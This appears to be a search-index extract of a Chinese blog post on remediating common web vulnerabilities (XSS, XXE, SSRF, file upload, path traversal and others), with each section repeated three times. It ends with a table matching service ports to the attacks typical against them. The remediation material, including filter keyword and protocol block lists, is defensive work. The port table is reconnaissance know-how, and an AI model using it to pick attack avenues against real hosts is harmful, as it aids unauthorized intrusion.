XSS漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义 过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” \u003c “，” \u003e “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。 不仅验证数据的类型，还要验证其格式、长度、范围和内容。 不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。 对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:2:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#2xss"},{"categories":["web"],"content":"\r2.XSS\rDescription​ Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML/JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。 Fix​ XSS漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义 过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” \u003c “，” \u003e “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。 不仅验证数据的类型，还要验证其格式、长度、范围和内容。 不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。 对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:2:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-1"},{"categories":["web"],"content":"\r2.XSS\rDescription​ Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML/JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。 Fix​ XSS漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义 过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” \u003c “，” \u003e “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。 不仅验证数据的类型，还要验证其格式、长度、范围和内容。 不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。 对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:2:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-1"},{"categories":["web"],"content":"\r3.XXE\rDescription​ XXE漏洞全称XML External Entity Injection即XML外部实体注入漏洞,XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。XEE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 Fix 检查所使用的底层XML解析库，默认禁止外部实体的解析 是若使用第三方应用代码,需要及时升级补丁 是对用户提交的XML数据进行过滤，如关键词：\u003c!DOCTYPE和\u003c!ENTITY或者SYSTEM和PUBLIC等 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:3:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#3xxe"},{"categories":["web"],"content":"\r3.XXE\rDescription​ XXE漏洞全称XML External Entity Injection即XML外部实体注入漏洞,XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。XEE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 Fix 检查所使用的底层XML解析库，默认禁止外部实体的解析 是若使用第三方应用代码,需要及时升级补丁 是对用户提交的XML数据进行过滤，如关键词：\u003c!DOCTYPE和\u003c!ENTITY或者SYSTEM和PUBLIC等 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:3:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-2"},{"categories":["web"],"content":"\r3.XXE\rDescription​ XXE漏洞全称XML External Entity Injection即XML外部实体注入漏洞,XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。XEE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 Fix 检查所使用的底层XML解析库，默认禁止外部实体的解析 是若使用第三方应用代码,需要及时升级补丁 是对用户提交的XML数据进行过滤，如关键词：\u003c!DOCTYPE和\u003c!ENTITY或者SYSTEM和PUBLIC等 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:3:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-2"},{"categories":["web"],"content":"\r4.CSRF\rDescription​ CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。 Fix 验证请求的Referer是否来自本网站（但可被绕过） 在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:4:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#4csrf"},{"categories":["web"],"content":"\r4.CSRF\rDescription​ CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。 Fix 验证请求的Referer是否来自本网站（但可被绕过） 在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:4:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-3"},{"categories":["web"],"content":"\r4.CSRF\rDescription​ CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。 Fix 验证请求的Referer是否来自本网站（但可被绕过） 在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:4:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-3"},{"categories":["web"],"content":"\r5.SSRF\rDescription​ SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。 ​ 这个漏洞造成的危害有： （1）可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息; （2）攻击运行在内网或本地的应用程序（比如溢出）; （3）对内网Web应用进行指纹识别，通过访问默认文件实现; （4）攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）; （5）利用File协议读取本地文件。 Fix 禁用不需要的协议，只允许HTTP和HTTPS请求，ban掉php伪协议如file://, gopher://, ftp:// 白名单的方式限制访问的目标地址，禁止对内网发起请求 过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 验证请求的文件格式 禁止跳转 限制请求的端口为http常用的端口，比如 80、443、8080、8000等 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:5:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#5ssrf"},{"categories":["web"],"content":"\r5.SSRF\rDescription​ SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。 ​ 这个漏洞造成的危害有： （1）可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息; （2）攻击运行在内网或本地的应用程序（比如溢出）; （3）对内网Web应用进行指纹识别，通过访问默认文件实现; （4）攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）; （5）利用File协议读取本地文件。 Fix 禁用不需要的协议，只允许HTTP和HTTPS请求，ban掉php伪协议如file://, gopher://, ftp:// 白名单的方式限制访问的目标地址，禁止对内网发起请求 过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 验证请求的文件格式 禁止跳转 限制请求的端口为http常用的端口，比如 80、443、8080、8000等 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:5:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-4"},{"categories":["web"],"content":"\r5.SSRF\rDescription​ SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。 ​ 这个漏洞造成的危害有： （1）可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息; （2）攻击运行在内网或本地的应用程序（比如溢出）; （3）对内网Web应用进行指纹识别，通过访问默认文件实现; （4）攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）; （5）利用File协议读取本地文件。 Fix 禁用不需要的协议，只允许HTTP和HTTPS请求，ban掉php伪协议如file://, gopher://, ftp:// 白名单的方式限制访问的目标地址，禁止对内网发起请求 过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 验证请求的文件格式 禁止跳转 限制请求的端口为http常用的端口，比如 80、443、8080、8000等 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:5:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-4"},{"categories":["web"],"content":"\r6.任意命令/代码执行\rDescription​ 命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。 Fix 严格过滤用户输入的数据，禁止执行非预期系统命令。 减少或不使用代码或命令执行函数 客户端提交的变量在放入函数前进行检测 减少或不使用危险函数 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:6:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#6任意命令代码执行"},{"categories":["web"],"content":"\r6.任意命令/代码执行\rDescription​ 命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。 Fix 严格过滤用户输入的数据，禁止执行非预期系统命令。 减少或不使用代码或命令执行函数 客户端提交的变量在放入函数前进行检测 减少或不使用危险函数 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:6:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-5"},{"categories":["web"],"content":"\r6.任意命令/代码执行\rDescription​ 命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。 Fix 严格过滤用户输入的数据，禁止执行非预期系统命令。 减少或不使用代码或命令执行函数 客户端提交的变量在放入函数前进行检测 减少或不使用危险函数 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:6:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-5"},{"categories":["web"],"content":"\r7.任意文件上传\rDescription　文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。 Fix 对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测 MIME类型检测以及限制上传文件的大小等限制来防御 限制相关上传文件目录的执行权限，防止木马执行 严格限制上传的文件路径 文件扩展名在服务端白名单校验 文件内容服务端校验 隐藏上传文件路径 将上传的文件其他文件存储服务器中 重命名上传的文件 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:7:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#7任意文件上传"},{"categories":["web"],"content":"\r7.任意文件上传\rDescription　文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。 Fix 对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测 MIME类型检测以及限制上传文件的大小等限制来防御 限制相关上传文件目录的执行权限，防止木马执行 严格限制上传的文件路径 文件扩展名在服务端白名单校验 文件内容服务端校验 隐藏上传文件路径 将上传的文件其他文件存储服务器中 重命名上传的文件 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:7:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-6"},{"categories":["web"],"content":"\r7.任意文件上传\rDescription　文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。 Fix 对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测 MIME类型检测以及限制上传文件的大小等限制来防御 限制相关上传文件目录的执行权限，防止木马执行 严格限制上传的文件路径 文件扩展名在服务端白名单校验 文件内容服务端校验 隐藏上传文件路径 将上传的文件其他文件存储服务器中 重命名上传的文件 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:7:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-6"},{"categories":["web"],"content":"\r8.目录穿越/目录遍历\rDescription文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符../跳出程序本身的限制目录，来下载或显示任意文件。 Fix 对传入的文件名参数进行过滤 判断是否是允许获取的文件类型 过滤回溯符../ ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:8:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#8目录穿越目录遍历"},{"categories":["web"],"content":"\r8.目录穿越/目录遍历\rDescription文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符../跳出程序本身的限制目录，来下载或显示任意文件。 Fix 对传入的文件名参数进行过滤 判断是否是允许获取的文件类型 过滤回溯符../ ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:8:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-7"},{"categories":["web"],"content":"\r8.目录穿越/目录遍历\rDescription文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符../跳出程序本身的限制目录，来下载或显示任意文件。 Fix 对传入的文件名参数进行过滤 判断是否是允许获取的文件类型 过滤回溯符../ ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:8:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-7"},{"categories":["web"],"content":"\r9.文件包含\rDescription　本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。 Fix 严格检查变量是否已经初始化 对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现./和../等目录跳转符 严格检查文件包含函数中的参数是否外界可控 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:9:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#9文件包含"},{"categories":["web"],"content":"\r9.文件包含\rDescription　本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。 Fix 严格检查变量是否已经初始化 对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现./和../等目录跳转符 严格检查文件包含函数中的参数是否外界可控 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:9:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-8"},{"categories":["web"],"content":"\r9.文件包含\rDescription　本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。 Fix 严格检查变量是否已经初始化 对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现./和../等目录跳转符 严格检查文件包含函数中的参数是否外界可控 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:9:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-8"},{"categories":["web"],"content":"\r10.暴力破解\rDescription​ 于没有对登录页面进行相关的人机验证机制，如无验证码、有验证码但可重复利用以及无登录错误次数限制等，导致攻击者可通过暴力破解获取用户登录账号和密码。 Fix 如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险) 如果某个 IP登录次数超过设置的阈值，则锁定IP 增加人机验证机制 验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:10:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#10暴力破解"},{"categories":["web"],"content":"\r10.暴力破解\rDescription​ 于没有对登录页面进行相关的人机验证机制，如无验证码、有验证码但可重复利用以及无登录错误次数限制等，导致攻击者可通过暴力破解获取用户登录账号和密码。 Fix 如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险) 如果某个 IP登录次数超过设置的阈值，则锁定IP 增加人机验证机制 验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:10:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-9"},{"categories":["web"],"content":"\r10.暴力破解\rDescription​ 于没有对登录页面进行相关的人机验证机制，如无验证码、有验证码但可重复利用以及无登录错误次数限制等，导致攻击者可通过暴力破解获取用户登录账号和密码。 Fix 如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险) 如果某个 IP登录次数超过设置的阈值，则锁定IP 增加人机验证机制 验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:10:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-9"},{"categories":["web"],"content":"\r11.越权访问\rDescription​ 由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。 Fix 对用户访问角色的权限进行严格的检查及限制 在一些操作时可以使用session对用户的身份进行判断和控制 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:11:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#11越权访问"},{"categories":["web"],"content":"\r11.越权访问\rDescription​ 由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。 Fix 对用户访问角色的权限进行严格的检查及限制 在一些操作时可以使用session对用户的身份进行判断和控制 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:11:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-10"},{"categories":["web"],"content":"\r11.越权访问\rDescription​ 由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。 Fix 对用户访问角色的权限进行严格的检查及限制 在一些操作时可以使用session对用户的身份进行判断和控制 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:11:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-10"},{"categories":["web"],"content":"\r12.未授权访问\rDescription​ 由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。 Fix 页面进行严格的访问权限的控制以及对访问角色进行权限检查 可以使用session对用户的身份进行判断和控制 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:12:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#12未授权访问"},{"categories":["web"],"content":"\r12.未授权访问\rDescription​ 由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。 Fix 页面进行严格的访问权限的控制以及对访问角色进行权限检查 可以使用session对用户的身份进行判断和控制 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:12:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-11"},{"categories":["web"],"content":"\r12.未授权访问\rDescription​ 由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。 Fix 页面进行严格的访问权限的控制以及对访问角色进行权限检查 可以使用session对用户的身份进行判断和控制 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:12:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-11"},{"categories":["web"],"content":"\r13.URL 跳转\rDescription​ 有的Web 应用程序中使用URL参数中的地址作为跳转链接的功能 ，攻击者可实施钓鱼、恶意网站跳转等攻击。 Fix 在进行页面跳转前校验传入的URL是否为可信域名 白名单规定跳转链接 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:13:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#13url-跳转"},{"categories":["web"],"content":"\r13.URL 跳转\rDescription​ 有的Web 应用程序中使用URL参数中的地址作为跳转链接的功能 ，攻击者可实施钓鱼、恶意网站跳转等攻击。 Fix 在进行页面跳转前校验传入的URL是否为可信域名 白名单规定跳转链接 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:13:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-12"},{"categories":["web"],"content":"\r13.URL 跳转\rDescription​ 有的Web 应用程序中使用URL参数中的地址作为跳转链接的功能 ，攻击者可实施钓鱼、恶意网站跳转等攻击。 Fix 在进行页面跳转前校验传入的URL是否为可信域名 白名单规定跳转链接 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:13:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-12"},{"categories":["web"],"content":"\r14.敏感信息泄露\rDescription​ 在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。 Fix 如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。 不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。 在服务器端对相关敏感信息进行模糊化处理。 对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。 【参考资料】： 腾讯云开发者社区-《【漏洞加固】常见Web漏洞修复建议》 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:14:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#14敏感信息泄露"},{"categories":["web"],"content":"\r14.敏感信息泄露\rDescription​ 在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。 Fix 如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。 不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。 在服务器端对相关敏感信息进行模糊化处理。 对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。 【参考资料】： 腾讯云开发者社区-《【漏洞加固】常见Web漏洞修复建议》 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:14:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-13"},{"categories":["web"],"content":"\r14.敏感信息泄露\rDescription​ 在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。 Fix 如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。 不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。 在服务器端对相关敏感信息进行模糊化处理。 对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。 【参考资料】： 腾讯云开发者社区-《【漏洞加固】常见Web漏洞修复建议》 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:14:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-13"},{"categories":["web","manual"],"content":"常见端口漏洞汇总 端口号 端口说明 相关漏洞 21 FTP文件传输协议 允许匿名的上传、下载、爆破和嗅探操作 22 SSH远程连接 爆破、SSH隧道及内网代理转发、文件传输 23 Telnet远程连接 爆破、嗅探、弱口令 25 SMTP邮件服务 邮件伪造 53 DNS域名服务器 允许区域传送、DNS劫持、缓存投毒、欺骗、CVE-2020-1350 67、68 DHCP服务 劫持、欺骗 69 小型文件传输协议 允许匿名的上传、下载、爆破和嗅探操作 80 常见web服务端口 web攻击、爆破、对应服务器版本漏洞 110 POP3协议 嗅探、爆破 139 SAMBA服务 爆破、未授权访问、远程代码执行 143 IMAP协议 爆破 161 SNMP协议 爆破、搜集目标内网信息 389 LDAP目录访问协议 注入、允许匿名访问、弱口令 443 常见web端口 web攻击、爆破、对应服务器版本漏洞 445 Microsoft-DS，为共享开放 代码执行、ms06-040、0796等 512/513/514 Linux rexec服务 爆破、远程登录 873 rsync服务 匿名访问、文件上传 1352 Lotus Domino邮件服务 弱口令、信息泄露、爆破 1433 MSSQL数据库 注入、提权、SA弱口令、爆破 1521 Oracle数据库 TNS爆破、注入、反弹shell 2049 NFS服务 配置不当 2181 ZooKeeper服务 未授权访问 3306 Mysql数据库 注入、提权、爆破 3389 RDP远程端口连接 shift后门、爆破、ms12-020、CVE-2019-0708 3690 SVN服务 SVN泄露、未授权访问 4848 GlassFish控制台 弱口令 5000 Sysbase/DB2数据库 爆破、注入 5432 PostgreSQL数据库 爆破、注入、弱口令 5632 PcAnywhere服务 抓取密码、代码执行 5900 VNC 弱口令爆破 5984 CouchDB 未授权访问 6379 Redis数据库 可尝试为授权访问、弱口令爆破 7001/7002 WebLogic控制台 反序列化、控制台弱口令 8009 Tomcat AJP协议 Tomcat AJP协议漏洞 8069 Zabbix服务 远程执行、SQL注入 8080、8089 JBoss/Resin/Jetty/Jenkins/tomcat 反序列化、控制台弱口令 8888 jupyter notebook 未授权访问 9090 WebSphere控制台 Java反序列化、弱口令 9200、9300 Elasticsearch服务 远程执行 10000 webmin控制面板 弱口令 11211 Memcached服务 未授权访问 27017/27018 MongoDB数据库 爆破、未授权访问 50000 SAP Management Console 远程执行 50050 CobaltStrike 弱口令 